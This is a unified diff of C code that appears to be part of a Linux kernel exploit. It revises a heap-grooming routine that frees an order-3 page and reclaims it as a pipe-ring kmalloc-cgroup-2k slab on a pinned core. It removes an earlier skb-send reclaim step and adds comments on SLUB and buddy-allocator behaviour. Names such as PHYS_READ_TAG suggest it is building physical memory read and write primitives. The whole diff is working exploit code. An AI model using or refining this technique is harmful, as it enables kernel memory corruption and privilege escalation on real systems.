@@ -13,10 +13,6 @@
 _Static_assert(sizeof(PHYS_READ_TAG) == sizeof(PHYS_WRITE_TAG),
                "phys proof tag sizes");
 
-#if !defined(SLIDE_SKB_SEND_SIZE)
-#define SLIDE_SKB_SEND_SIZE SKB_SEND_SIZE
-#endif
-
 static int pipe_objects_ready;
 static int pipe_fds_drain[PIPE_DRAIN][2];
 static int pipe_fds_reclaim[PIPE_RECLAIM][2];
@@ -359,68 +355,26 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
    * 32 owned mm fds, closes one trigger per trigger slab to create partial-slab
    * pressure, then closes the last owned fd so SLUB discards the emptied slab
    * instead of leaving it frozen on the per-CPU list where it was reused with
-   * inuse=32 obj=32 frozen=1. 16 order-3 skb sends then take the freed page and
-   * the skb close hands it back to the buddy (pcp LIFO), so the ring pipe
-   * arrays get it as a fresh kmalloc-cgroup-2k slab. The drain's held trigger
-   * objects are released only after the ring allocations: freeing them first
-   * would hand ~24 extra slabs to the buddy and the sends/rings would take
-   * those instead of the freed page. */
-  int skb_sv[2] = {-1, -1};
-  if (socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv) != 0) {
-    skb_sv[0] = -1;
-    skb_sv[1] = -1;
-  }
-  unsigned char *skb_page_buf = NULL;
-  struct iovec skb_iov;
-  struct msghdr skb_msg;
-  if (skb_sv[0] >= 0) {
-    int sndbuf = 1 << 20;
-    setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-    skb_page_buf = malloc(SLIDE_SKB_SEND_SIZE);
-    if (skb_page_buf) {
-      memset(skb_page_buf, 0, SLIDE_SKB_SEND_SIZE);
-      memset(&skb_iov, 0, sizeof(skb_iov));
-      skb_iov.iov_base = skb_page_buf;
-      skb_iov.iov_len = SLIDE_SKB_SEND_SIZE;
-      memset(&skb_msg, 0, sizeof(skb_msg));
-      skb_msg.msg_iov = &skb_iov;
-      skb_msg.msg_iovlen = 1;
-    }
-  }
-
+   * inuse=32 obj=32 frozen=1. The last close frees the order-3 page intact to
+   * the pcp list of CORE, and the ring allocations run next on that same core
+   * (the drain and this thread stay pinned) so the fresh kmalloc-cgroup-2k
+   * slab takes the whole order-3 page directly for its 16 objects.
+   * No intermediate owner is used for the pipe page: the 16-send skb burst
+   * split the freed order-3 block into separate free order-0 pages (idx 2..7
+   * at gate time), leaving nothing an order-3 slab could claim. The drain's
+   * held trigger objects are released only after the ring allocations: freeing
+   * them first would hand ~24 extra slabs to the buddy and the rings would
+   * take those instead of the freed page. */
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, dummy_sv));
   if (!drain_controlled_mm_group(group_fds, &st, dummy_sv)) {
     release_controlled_mm_drain(&st);
-    if (skb_sv[0] >= 0) {
-      SYSCHK(close(skb_sv[0]));
-    }
-    if (skb_sv[1] >= 0) {
-      SYSCHK(close(skb_sv[1]));
-    }
-    free(skb_page_buf);
     return 0;
   }
 
-  int reclaim_sent = 0;
-  if (skb_page_buf) {
-    for (int i = 0; i < SKB_RECLAIM_SENDS; ++i) {
-      if (sendmsg(skb_sv[0], &skb_msg, MSG_DONTWAIT) <= 0) {
-        break;
-      }
-      reclaim_sent++;
-    }
-    SYSCHK(close(skb_sv[0]));
-    skb_sv[0] = -1;
-    SYSCHK(close(skb_sv[1]));
-    skb_sv[1] = -1;
-  }
-
-  pin_to_core(CORE);
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
       pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
       release_controlled_mm_drain(&st);
-      free(skb_page_buf);
       return 0;
     }
   }
@@ -454,9 +408,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
                 (size_t)PIPE_RECLAIM * P0_PIPE_RING_MIN_SLOTS);
   }
 
-  pr_info("pipe controlled page base=%016zx freed=%d sends=%d\n", base,
-          (int)(ORDER3_SIZE / MM_STRUCT_SZ), reclaim_sent);
-  free(skb_page_buf);
+  pr_info("pipe controlled page base=%016zx freed=%d rings=%d\n", base,
+          (int)(ORDER3_SIZE / MM_STRUCT_SZ), (int)PIPE_RECLAIM);
   return base;
 }
 
